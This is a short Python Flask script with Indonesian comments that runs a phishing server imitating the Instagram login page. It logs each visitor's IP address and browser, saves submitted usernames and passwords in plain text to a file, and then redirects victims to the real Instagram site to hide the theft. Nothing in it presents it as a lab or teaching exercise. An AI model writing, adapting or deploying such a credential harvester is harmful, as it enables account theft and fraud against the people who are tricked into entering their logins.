from flask import Flask, request, redirect, render_template
from datetime import datetime
import os

app = Flask(__name__)

@app.route('/')
def login():
    # Log IP dan User-Agent
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    with open('logs/visitors.log', 'a') as f:
        f.write(f'{datetime.now()} - IP: {ip} - UA: {ua}\n')
    return render_template('login_ig.html')  # Halaman palsu

@app.route('/login', methods=['POST'])
def capture_login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    with open('logs/credentials.txt', 'a') as f:
        f.write(f'{datetime.now()} | IP: {ip} | {username}:{password}\n')
    return redirect('https://www.instagram.com/')  # Redirect ke situs asli

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
